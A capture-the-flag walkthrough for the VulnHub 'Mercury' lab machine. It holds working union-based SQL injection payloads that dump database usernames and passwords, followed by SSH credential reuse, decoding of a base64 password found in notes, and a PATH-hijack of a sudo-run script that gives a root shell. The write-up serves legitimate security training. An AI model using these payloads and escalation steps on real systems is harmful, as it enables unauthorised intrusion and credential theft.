---
tags:
  - VulnHub
  - Linux
  - Easy
  - SQLi
  - Leakage
  - Sudo
  - PATH-HJ
---
https://www.vulnhub.com/entry/the-planets-mercury,544/
# Add Hosts
Append to the `/etc/hosts` file:
```text
192.168.0.248 mercury.local
```
# Scanning
```console
$ nmap -p22,8080 -sV -sC mercury.local

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c8:24:ea:2a:2b:f1:3c:fa:16:94:65:bd:c7:9b:6c:29 (RSA)
|   256 e8:08:a1:8e:7d:5a:bc:5c:66:16:48:24:57:0d:fa:b8 (ECDSA)
|_  256 2f:18:7e:10:54:f7:b9:17:a2:11:1d:8f:b3:30:a5:2a (ED25519)
8080/tcp open  http    WSGIServer 0.2 (Python 3.8.2)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| http-robots.txt: 1 disallowed entry 
|_/
MAC Address: 08:00:27:07:5B:3E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Enumeration
Found [mercuryfacts/](http://mercury.local:8000/mercuryfacts/) directory because Django's debug settings are enabled when visiting a non-existent resource:
```text
Page not found (404)
Request Method: GET
Request URL: http://mercury.local:8080/abc

Using the URLconf defined in mercury_proj.urls, Django tried these URL patterns, in this order:
1. [name='index']
2. robots.txt [name='robots']
3. mercuryfacts/
The current path, abc, didn't match any of these.

You're seeing this error because you have DEBUG = True in your Django settings file. Change that to False, and Django will display a standard 404 page.
```
Found **SQL query from Django** at http://mercury.local:8080/mercuryfacts/abc/:
```python
cursor.execute('SELECT fact FROM facts WHERE id = ' + fact_id)
```
# Exploitation
Create functions to inject SQL queries:
```bash
urlencode() {
	echo -n "$1" | jq --raw-input --slurp --raw-output @uri
}

sqli() {
	payload=$(urlencode "$1")
	curl -s "http://mercury.local:8080/mercuryfacts/$payload/"
}
```
Extracted `mercury` database:
```console
$ sqli "0 UNION SELECT group_concat(schema_name) FROM information_schema.schemata"

Fact id: 0 UNION SELECT group_concat(schema_name) FROM information_schema.schemata. (('information_schema,mercury',),)
```
Extracted `users` table:
```console
$ sqli "0 UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='mercury'"

Fact id: 0 UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='mercury'. (('facts,users',),)
```
Extracted `username` and `password` columns:
```console
$ sqli "0 UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'"

Fact id: 0 UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'. (('id,password,username',),)
```
Extracted list with **usernames** and **passwords**:
```console
$ sqli "0 UNION SELECT group_concat(username,':',password) FROM users"

Fact id: 0 UNION SELECT group_concat(username,':',password) FROM users. (('john:johnny1987,laura:lovemykids111,sam:lovemybeer111,webmaster:mercuryisthesizeof0.056Earths',),)
```
Log in via SSH with **reused credentials**:
```bash
ssh webmaster@mercury.local
```
Read **user flag**:
```bash
cat /home/webmaster/user_flag.txt
```
# Post-Exploitation
Found **base64 encoded password** for **user linuxmaster**:
```console
$ cat /home/webmaster/mercury_proj/notes.txt

Project accounts (both restricted):
webmaster for web stuff - webmaster:bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK
linuxmaster for linux stuff - linuxmaster:bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==
```
Decoded the password:
```console
$ base64 -d <<< 'bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg=='

mercurymeandiameteris4880km
```
Become **user linuxmaster**:
```bash
su linuxmaster
```
Found an executable with **sudo privileges**:
```console
$ sudo -l

User linuxmaster may run the following commands on mercury:
    (root : root) SETENV: /usr/bin/check_syslog.sh
```
The script runs the `tail` command insecurely:
```console
$ cat /usr/bin/check_syslog.sh

#!/bin/bash
tail -n 10 /var/log/syslog
```
Create our own `tail` executable, add it to the system **PATH** and run it as **root**:
```console
$ echo -e '#!/bin/bash\n/bin/bash' > /tmp/tail

$ chmod +x /tmp/tail

$ PATH=/tmp:$PATH

$ sudo --preserve-env=PATH /usr/bin/check_syslog.sh
```
Read **root flag**:
```bash
cat /root/root_flag.txt
```